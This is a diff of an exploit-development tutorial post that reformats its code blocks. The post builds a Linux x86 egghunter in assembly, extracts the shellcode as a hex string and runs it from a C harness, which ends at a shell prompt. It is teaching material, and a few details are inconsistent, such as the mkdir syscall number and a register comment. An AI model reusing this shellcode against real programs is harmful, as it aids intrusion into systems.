@@ -38,7 +38,6 @@ tags:
 <p style="text-align:justify;">The address space at IA32 can have the smallest granular unit of memory which is <em>4096</em> bytes of page size. The following C program will show the page size used by the operating system</p>
 
 ```c
-
 #include <stdio.h>
 #include <unistd.h>
 
@@ -47,19 +46,15 @@ int main (void)
 printf ("the page size is %ld bytes. \n", sysconf(_SC_PAGESIZE));
 return 0;
 }
-
-
 ```
 
 After compiling and executing the program the results will be as follows
 
-```bash
-
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~/Documents# gcc -o pagesize pagesize.c
 root@kali:~/Documents# ./pagesize
 the page size is 4096 bytes.
-
-```
+</pre>
 
 <p style="text-align:justify;">Furthermore, aligning a page on a page-sized boundary (e.g. 4096 bytes) allows the&nbsp; hardware to map a virtual address to a physical address by substituting the higher bits in the address, rather doing complex arithmetic.</p>
 
@@ -85,12 +80,10 @@ As Skape mentioned to his <a href="http://www.hick.org/code/skape/papers/egghunt
 <em>mkdir(2)</em> prototype :
 
 ```c
-
 #include <sys/stat.h>
 #include <sys/types.h>
 
 int mkdir(const char *pathname, mode_t mode);
-
 ```
 
 <h3><span style="color:#33cccc;"><span style="color:#339966;">The Egg Hunter</span> <span style="color:#339966;">Implementation</span></span></h3>
@@ -109,28 +102,24 @@ The steps to build the <strong>Egghunter</strong> will be the following
 <h3><span style="color:#339966;">Analysis and Implementation&nbsp;</span></h3>
 <p style="text-align:justify;">First the following three instructions will be used to initialise registers. The <strong>ebx</strong> contains the four byte version of the egg tag that is searched, which, in this case is <strong>0x50905090. </strong>Then the <strong>ecx </strong>register will be zeroed out using <strong>xor</strong> instruction as well the <strong>edx</strong> and <strong>eax</strong> using <strong>mul</strong> instruction.</p>
 
-```c
-
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 _start:  
 mov ebx, 0x50905090    ; Store EGG in EDX 
 xor ecx, ecx           ; Zero out ECX  
 mul ecx                ; Zero out EAX and EDX
-
-```
+</pre>
 
 <p style="text-align:justify;">Next, the <strong>dx</strong> register will be used to perform memory alignment while taking into consideration the smallest granular unit of memory on <em>IA32</em> which is <em>PAGE_SIZE</em> with the size of <strong>4096</strong> bytes. The memory alignment must be performed in case an invalid memory address might returned from the <em>mkdir(2)</em> syscall, where in such case all addresses in the memory page will also be invalid. So, in order to avoid shellcode from breaking because of the existence of null bytes in case of the hex representation of <strong>4096</strong> bytes (<strong>0x1000</strong>), the following technique will be followed</p>
 
-```c
-
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 npage:                    
 or dx, 0xfff    ; Align a region of memory
-
-```
+</pre>
 
 <p style="text-align:justify;">Next, <strong>pushad</strong> instruction will push all general registers into the stack in order to preserve values to be used with <em>mkdir(2)</em> syscall. Later on, the <strong>ebx</strong> register will hold the address <strong>[edx+4]</strong> and then the lower byte register <strong>al</strong> will be assigned with the immediate value <b>0x0c </b>which represents the <em>mkdir(2)</em> syscall. After that, the <strong>int 0x80</strong> instruction will call <em>mkdir(2)</em>&nbsp;syscall. Later on, the return value from <em>mkdir(2)</em>&nbsp;syscall will be compared with the hex value <strong>0xf2</strong> which represents the <strong>EFAULT</strong> errno value.</p>
 
-```c
 
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 naddr:
 inc edx                 ; increase EDX to achieve 4096 bytes page (4KiB)                                   
 pushad                  ; push the general purpose values into the stack
@@ -138,13 +127,11 @@ lea ebx, [edx+4]        ; put address [edx+4] to ebx
 mov al, 0x4e            ; syscall for mkdir() to lower byte register al 
 int 0x80                ; call mkdir()  
 cmp al, 0xf2            ; 0xf2 is 242 in decimal - check for EFAULT (errno code 256-242 = 14 - bad file address)
-
-```
+</pre>
 
 <p style="text-align:justify;">Then all the registers will restore their values by using <strong>popad</strong> instruction. In case the <em>mkdir(2)</em> syscall doesn't return <strong>EFAULT</strong>, then the value stored in <strong>ebx</strong>&nbsp;will be compared with the value contained in <strong>[edx]</strong> address in order to check if the egg<strong> 0x50905090</strong>&nbsp;tag is located inside this address. Otherwise, in case the <em>mkdir(2)</em> syscall returns <strong>EFAULT</strong>, then the memory address space will be indicated as invalid and the search will be forwarded to the next page. Also in case the first comparison is successful, meaning the egg<strong> 0x50905090 </strong>tag is found, the next<em> four(4)</em> bytes will also be checked in order to find out if the second egg<strong> 0x50905090</strong>&nbsp;tag is also assigned. Furthermore, if the egg<strong> 0x50905090</strong>&nbsp;tag is not assigned to the address <strong>[edx+4], </strong>the next address will also be checked, otherwise <strong>[edx]</strong> and <strong>[edx+4]</strong> will contain the egg tag.</p>
 
-```c
-
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 popad            ; restore the general purpose registers 
 jz npage         ; if mkdir() returned EFAULT, go to the next page 
 cmp [edx], ebx   ; check if egg 0x50905090 tag is in [edx] address
@@ -152,22 +139,18 @@ jnz  naddr       ; if ZF=0 then it doesnt match so it goes to the next page
 cmp [edx+4], ebx ; also check if EGG second tag is found in [edx+4] 
 jne naddr        ; If egg (0x50905090) tag not found then visit next address 
 jmp edx          ; [edx] and [edx+4] contain the second egg (0x50905090)
-
-```
+</pre>
 
 Now lets proceed further and test the hunter. First, the program will be compiled using the following commands
 
-```bash
-
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~/Documents/SLAE/Assignment3# nasm -f elf -o egg.o egg.nasm
 root@kali:~/Documents/SLAE/Assignment3# ld -z execstack -o egg egg.o
-
-```
+</pre>
 
 Then the opcodes will be checked if null bytes exist using&nbsp;<strong>objdump</strong>
 
-```bash
-
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~/Documents/SLAE/Assignment3# objdump -M intel -D egg
 
 egg:     file format elf32-i386
@@ -175,15 +158,15 @@ egg:     file format elf32-i386
 
 Disassembly of section .text:
 
-08049000 <_start>:
+08049000 &#x3c;_start>:
  8049000:   bb 90 50 90 50          mov    ebx,0x50905090
  8049005:   31 c9                   xor    ecx,ecx
  8049007:   f7 e1                   mul    ecx
 
-08049009 <npage>:
+08049009 &#x3c;npage >:
  8049009:   66 81 ca ff 0f          or     dx,0xfff
 
-0804900e <naddr>:
+0804900e &#x3c;naddr >:
  804900e:   42                      inc    edx
  804900f:   60                      pusha
  8049010:   8d 5a 04                lea    ebx,[edx+0x4]
@@ -191,31 +174,27 @@ Disassembly of section .text:
  8049015:   cd 80                   int    0x80
  8049017:   3c f2                   cmp    al,0xf2
  8049019:   61                      popa
- 804901a:   74 ed                   je     8049009 <npage>
+ 804901a:   74 ed                   je     8049009 &#x3c;npage>
  804901c:   39 1a                   cmp    DWORD PTR [edx],ebx
- 804901e:   75 ee                   jne    804900e <naddr>
+ 804901e:   75 ee                   jne    804900e &#x3c;naddr>
  8049020:   39 5a 04                cmp    DWORD PTR [edx+0x4],ebx
- 8049023:   75 e9                   jne    804900e <naddr>
+ 8049023:   75 e9                   jne    804900e &#x3c;naddr>
  8049025:   ff e2                   jmp    edx
-
- ```
+</pre>
 
 Then the <em>shellcode&nbsp;</em>will be produced using <strong>objdump</strong>&nbsp;as follows
 
-```bash
-
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~/Documents/SLAE/Assignment3# objdump -d ./egg|grep '[0-9a-f]:'|grep -v 
 'file'|cut -f2 -d:|cut -f1-5 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 
 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0
 \x0c\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"
-
-```
+</pre>
 
 The following program will be used for the execution of the Egghunter
 
 ```c
-
 #include <stdio.h>
 #include <string.h>
 
@@ -240,16 +219,14 @@ int main()
         int (*ret)() = (int(*)()) egghunter;
         ret();
 }
-
 ```
 
 if we compile and run the code above we will have a our&nbsp; execve shellcode executed
 
-```bash
 
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~/Documents/SLAE/Assignment3# gcc -fno-stack-protector -g -z execstack -m32 -o shell shell.c ./shell
 Shellcode Length: 33
 #
-
-```
+</pre>
 
